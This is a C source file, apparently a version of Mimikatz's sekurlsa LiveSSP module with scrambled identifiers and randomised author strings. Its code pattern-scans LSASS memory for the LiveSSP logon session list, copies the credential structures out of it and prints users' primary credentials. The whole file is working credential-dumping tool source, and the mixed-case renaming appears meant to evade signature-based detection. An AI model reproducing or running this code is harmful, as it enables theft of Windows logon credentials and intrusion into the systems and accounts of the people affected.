/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#include "kuhl_m_seKuRlSa_liVeSsP.h"
#if !defined(_M_ARM64)
#if defined(_M_X64)
BYTE PTRN_WALL_LiveLocateLogonSession[]	= {0x74, 0x25, 0x8b};
KULL_M_PATCH_GENERIC LiveReferences[] = {
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_LiveLocateLogonSession),	PTRN_WALL_LiveLocateLogonSession},	{0, NULL}, {-7}},
};
#elif defined(_M_IX86)
BYTE PTRN_WALL_LiveLocateLogonSession[]	= {0x8b, 0x16, 0x39, 0x51, 0x24, 0x75, 0x08};
KULL_M_PATCH_GENERIC LiveReferences[] = {
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_LiveLocateLogonSession),	PTRN_WALL_LiveLocateLogonSession},	{0, NULL}, {-8}},
};
#endif

PJlzW_LIVESSP_LIST_ENTRY LiveGlobalLogonSessionList = NULL;

KUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_liVeSsP_package = {L"liVeSsP", kuhl_m_seKuRlSa_enum_logon_callback_liVeSsP, FALSE, L"liVeSsP.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_liVeSsP_single_package[] = {&kuhl_m_seKuRlSa_liVeSsP_package};

NTSTATUS kuhl_m_seKuRlSa_liVeSsP(int argc, wchar_t * argv[])
{
	return kuhl_m_seKuRlSa_getLogonData(kuhl_m_seKuRlSa_liVeSsP_single_package, 1);
}

void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_liVeSsP(IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JlzW_LIVESSP_LIST_ENTRY crEdentials;
	JlzW_LIVESSP_PRIMARY_CREDENTIAL primaryCredential;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&crEdentials, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
	
	if(kuhl_m_seKuRlSa_liVeSsP_package.Module.isInit || kuhl_m_seKuRlSa_utils_search_generic(pData->cLsass, &kuhl_m_seKuRlSa_liVeSsP_package.Module, LiveReferences, ARRAYSIZE(LiveReferences), (PVOID *) &LiveGlobalLogonSessionList, NULL, NULL, NULL))
	{
		aLsassMemory.address = LiveGlobalLogonSessionList;
		if(aLsassMemory.address = kuhl_m_seKuRlSa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(JlzW_LIVESSP_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
		{
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(JlzW_LIVESSP_LIST_ENTRY)))
			{
				if(aLsassMemory.address = crEdentials.suppCreds)
				{
					aLocalMemory.address = &primaryCredential;
					if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(JlzW_LIVESSP_PRIMARY_CREDENTIAL)))
						kuhl_m_seKuRlSa_genericCredsOutput(&primaryCredential.crEdentials, pData, (pData->cLsass->osContext.BuildNumber != 9431) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT);
				}
			}
		}
	} else kprintf(L"KO");
}
#endif